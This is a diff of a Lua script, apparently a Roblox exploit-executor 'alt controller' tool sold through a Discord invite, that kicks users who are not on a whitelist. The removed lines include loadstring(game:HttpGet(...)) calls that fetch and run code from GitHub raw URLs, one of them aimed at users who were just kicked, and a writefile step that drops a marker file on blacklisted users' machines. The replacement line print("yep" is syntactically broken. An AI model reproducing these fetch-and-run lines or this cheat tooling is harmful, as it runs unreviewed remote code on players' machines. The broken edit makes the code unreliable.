@@ -25,7 +25,6 @@ local AltControllers = {
 local p = game:GetService("Players").LocalPlayer
 if not table.find(AltControllers, p.Name) then
     p:Kick("Not On Whitelist, Buy The Script. discord.gg/TRShpFeqGK")
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/randomalotfornoreason/IlIlIlI/main/IlIlIlIlI", true))()
 end
 
 local Whitelisted = {
@@ -77,13 +76,6 @@ if game:GetService("ReplicatedStorage"):FindFirstChild("lIIl") then
 end
 
 if table.find(Blacklisted, game:GetService("Players").LocalPlayer.UserId) then
-    if not isfile("123712091724.lua") then
-        writefile("123712091724.lua", "...")
-    end
-end
-
-if isfile("123712091724.lua") then
-    wait(.1)
     game.Players.LocalPlayer:Kick("Blacklisted.")
 else
 	Notify("Check Console For Info", 10)
@@ -91,7 +83,7 @@ else
 	if not table.find(AltControllers, p.Name) then
         return
     else
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/nanosgithubaccount/g/main/g", true))()
+        print("yep"
     end
 end
 
